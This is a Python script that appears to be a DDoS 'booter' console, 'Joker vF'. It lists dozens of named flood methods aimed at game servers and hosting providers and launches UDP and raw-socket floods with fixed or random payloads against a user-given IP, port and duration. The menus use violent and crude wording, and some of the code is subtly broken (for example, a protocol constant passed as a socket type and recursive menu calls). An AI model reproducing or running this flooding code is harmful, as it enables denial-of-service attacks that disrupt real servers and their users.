#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "desyn"

methods = """
\036	[35m╔════════════════════════╗
\036	[35m║ \036	[36m---- \036	[35mMethods List! \036	[36m--- \036	[35m╚═════════╗
\036	[35m║ \036	[93mgen3   \036	[36m> \036	[35mShows Gen3 Methods!     \036	[35m║
\036	[35m║ \036	[35mgen2   \036	[36m> \036	[35mShows Gen2 Methods!     \036	[35m║
\036	[35m║ \036	[35mlayer4 \036	[36m> \036	[35mShows Layer 4 Methods!  \036	[35m║
\036	[35m║ \036	[35mlayer7 \036	[36m> \036	[35mShows Layer 7 Methods!  \036	[35m║
\036	[35m║ \036	[35mprivate\036	[36m> \036	[35mShows Private Methods!  \036	[35m║
\036	[35m║ \036	[35mraw    \036	[36m> \036	[35mShows Raw Methods!      \036	[35m║
\036	[35m║ \036	[35mmore   \036	[36m> \036	[35mShows More Methods!     \036	[35m║
\036	[35m╚══════════════════════════════════╝
"""

raw = """
\036	[35m                                 ╦╔═╗╦╔═\036	[35m╔═╗╦═╗
\036	[35m                                 ║║ ║╠╩╗\036	[35m║╣ ╠╦╝
\036	[35m                                ╚╝╚═╝╩ ╩\036	[35m╚═╝╩╚═
\036	[35m                            🤡 We are al\036	[35ml clowns 🤡

\036	[35m            ╔══════════════════════════╦════════════════════════════╗
\036	[35m            ║ \036	[35mudpraw \036	[36m- \036	[35mRaw UDP Flood \036	[35m  ║ \036	[35mhexraw \036	[36m- \036	[35mRaw HEX Flood \036	[35m    ║
\036	[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\036	[35m             ║ \036	[35mtcpraw \036	[36m- \036	[35mRaw TCP Flood \036	[35m║ ║ \036	[35mvseraw \036	[36m- \036	[35mRaw VSE Flood \036	[35m  ║
\036	[35m             ║ \036	[35mstdraw \036	[36m- \036	[35mRaw STD Flood \036	[35m║ ║ \036	[35msynraw \036	[36m- \036	[35mRaw SYN Flood \036	[35m  ║
\036	[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\036	[35m            ║    \036	[35mExample How To Attack\036	[93m: \036	[31mMETHOD [IP] [TIME] [PORT]   \036	[35m║
\036	[35m            ╚═══════════════════════════════════════════════════════╝
"""
gen3 = """
\036	[35m                                 ╦╔═╗╦╔═\036	[35m╔═╗╦═╗
\036	[35m                                 ║║ ║╠╩╗\036	[35m║╣ ╠╦╝
\036	[35m                                ╚╝╚═╝╩ ╩\036	[35m╚═╝╩╚═
\036	[35m                            🤡 We are al\036	[35ml clowns 🤡

\036	[35m            ╔══════════════════════════╦════════════════════════════╗
\036	[35m            ║ \036	[35movhslav \036	[36m- \036	[35mSlavic Flood \036	[35m  ║ \036	[35miotv1 \036	[36m- \036	[35mCustom Method!  \036	[35m   ║
\036	[35m            ║ \036	[35mcpukill \036	[36m- \036	[35mCpu Rape Flood\036	[35m ║ \036	[35miotv2 \036	[36m- \036	[35mCustom Method!  \036	[35m   ║
\036	[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\036	[35m             ║ \036	[35mfivemkill \036	[36m- \036	[35mFivem Kill \036	[35m║ ║ \036	[35miotv3 \036	[36m-\036	[35m Custom Method!  \036	[35m ║
\036	[35m             ║ \036	[35micmprape  \036	[36m- \036	[35mICMP Rape  \036	[35m║ ║ \036	[35mssdp  \036	[36m-\036	[35m Amped SSDP      \036	[35m ║
\036	[35m             ║ \036	[35mtcprape \036	[36m- \036	[35mRaping TCP   \036	[35m║ ║ \036	[35marknull \036	[36m- \036	[35mArk Method    \036	[35m ║
\036	[35m             ║ \036	[35mnforape \036	[36m- \036	[35mNfo Method   \036	[35m║ ║ \036	[35m2kdown  \036	[36m- \036	[35mNBA 2K Flood  \036	[35m ║
\036	[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\036	[35m            ║    \036	[35mExample How To Attack\036	[93m: \036	[31mMETHOD [IP] [TIME] [PORT]   \036	[35m║
\036	[35m            ╚═══════════════════════════════════════════════════════╝
"""

private = """
\036	[35m                                 ╦╔═╗╦╔═\036	[35m╔═╗╦═╗
\036	[35m                                 ║║ ║╠╩╗\036	[35m║╣ ╠╦╝
\036	[35m                                ╚╝╚═╝╩ ╩\036	[35m╚═╝╩╚═
\036	[35m                             🤡 We will\036     [35ml kill you

\036	[35m            ╔══════════════════════════╦════════════════════════════╗
\036	[35m            ║ \036	[35mhomeslap    \036	[36m. \036	[35mr6kill     \036	[35m║ \036	[35mfivemtcp  \036	[36m. \036	[35mnfokill       \036	[35m ║
\036	[35m            ║ \036	[35mark255      \036	[36m. \036	[35marklift    \036	[35m║ \036	[35mhotspot   \036	[36m. \036	[35mvpn           \036	[35m ║
\036	[35m            ║ \036	[35mhydrakiller \036	[36m. \036	[35markdown    \036	[35m║ \036	[35mnfonull   \036	[36m. \036	[35mdhcp          \036	[35m ║
\036	[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\036	[35m             ║ \036	[35movhnat    \036	[36m. \036	[35movhamp     \036	[35m║ ║ \036	[35movhwdz    \036	[36m. \036	[35movhx         \036	[35m║
\036	[35m             ║ \036	[35mnfodrop   \036	[36m. \036	[35mnfocrush   \036	[35m║ ║ \036	[35mnfodown   \036	[36m. \036	[35mnfox         \036	[35m║
\036	[35m             ║ \036	[35mudprape   \036	[36m. \036	[35mudprapev3  \036	[35m║ ║ \036	[35mfortnite  \036	[36m. \036	[35mfortnitev2   \036	[35m║
\036	[35m             ║ \036	[35mudprapev2 \036	[36m. \036	[35mudpbypass  \036	[35m║ ║ \036	[35mgreeth    \036	[36m. \036	[35mtelnet       \036	[35m║
\036	[35m             ║ \036	[35mfivemv2   \036	[36m. \036	[35mr6drop     \036	[35m║ ║\036	[35m r6freeze  \036	[36m. \036	[35mkillall      \036	[35m║
\036	[35m             ║ \036	[35m2krape    \036	[36m. \036	[35mfallguys   \036	[35m║ ║ \036	[35movhdown   \036	[36m. \036	[35movhkill      \036	[35m║
\036	[35m             ║ \036	[35mfivemrape \036	[36m. \036	[35mfivemdown  \036	[35m║ ║ \036	[35mfivemv1   \036	[36m. \036	[35mfivemslump   \036	[35m║
\036	[35m             ║ \036	[35mkillallv2 \036	[36m. \036	[35mkillallv3  \036	[35m║ ║ \036	[35mpowerslap \036	[36m. \036	[35mrapecom      \036	[35m║
\036	[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\036	[35m            ║    \036	[35mExample How To Attack\036	[93m: \036	[31mMETHOD [IP] [TIME] [PORT]   \036	[35m║
\036	[35m            ╚═══════════════════════════════════════════════════════╝
"""


layer4 = """\036	[35m
\036	[35m                                 ╦╔═╗╦╔═\036	[35m╔═╗╦═╗
\036	[35m                                 ║║ ║╠╩╗\036	[35m║╣ ╠╦╝
\036	[35m                                ╚╝╚═╝╩ ╩\036	[35m╚═╝╩╚═
\036	[35m                            🤡 We are al\036	[35ml clowns 🤡

\036	[35m            ╔══════════════════════════╦════════════════════════════╗
\036	[35m            ║  \036	[35mudp \036	[36m[IP] [TIME] [PORT]  \036	[35m║   \036	[35mvse \036	[36m[IP] [TIME] [PORT]   \036	[35m║
\036	[35m            ║  \036	[35mtcp \036	[36m[IP] [TIME] [PORT]  \036	[35m║   \036	[35mack \036	[36m[IP] [TIME] [PORT]   \036	[35m║
\036	[35m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\036	[35m             ║ \036	[35mstd \036	[36m[IP] [TIME] [PORT] \036	[35m║ ║ \036	[35mdns \036	[36m[IP] [TIME] [PORT]   \036	[35m║
\036	[35m             ║ \036	[35msyn \036	[36m[IP] [TIME] [PORT] \036	[35m║ ║ \036	[35movh \036	[36m[IP] [TIME] [PORT]   \036	[35m║
\036	[35m             ║\036	[36m- - - - - - - \036	[93mhomerape \036	[35m[IP] [TIME] [PORT] \036	[36m- - - - - -\036	[35m║
\036	[35m            ╔╩════════════════════════╝ ╚══════════════════════════╩╗
\036	[35m            ║    \036	[35mExample How To Attack\036	[93m: \036	[31mMETHOD [IP] [TIME] [PORT]   \036	[35m║
\036	[35m            ╚═══════════════════════════════════════════════════════╝
"""

banner =  """
\036	[35m                                 ╦╔═╗╦╔═\036	[35m╔═╗╦═╗
\036	[35m                                 ║║ ║╠╩╗\036	[35m║╣ ╠╦╝
\036	[35m                                ╚╝╚═╝╩ ╩\036	[35m╚═╝╩╚═
\036	[35m                            🤡 We are al\036	[35ml clowns 🤡

\036	[35m                ╔═══════════════════════════════════════════════╗
\036	[35m                ║\036	[35m- - - - - - - Joker vF By \036	[36m@iotnet \036	[35m- - - - - - -║
\036	[35m                ║\036	[35m  - - - Type \036	[36mhelp\036	[35m to see the Help Menu - - - - ║
\036	[35m                ╚═══════════════════════════════════════════════╝


\036	[35m                    ╔════════════════════════════════════════╗
\036	[35m                    ║\036	[35m- -Connection Has Been \036	[36m(ESTABILISHED)- -\036	[35m║
\036	[35m                    ╚════════════════════════════════════════╝
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(32500,41500))
		sys.stdout.write("\x1b]2;Joker. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\036	[35m[\036	[35m{}\036	[35m@Joker]\036	[36m$ \036	[96m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if sinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "?":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "layer4":
			os.system ("clear")
			print (layer4)
			main()
		elif sinput == "method":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "methods":
			os.system ("clear")
			print (methods)
			main()
		elif sinput == "private":
			os.system ("clear")
			print (private)
			main()
		elif sinput == "gen3":
			os.system ("clear")
			print (gen3)
			main()
		elif sinput == "raw":
			os.system ("clear")
			print (raw)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "std":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "syn":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\036	[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4096
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "homeslap":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv2":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killallv3":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprape":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 0
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev2":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbypass":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\036	[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\036	[97mYour Attack Has Been Launched!")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

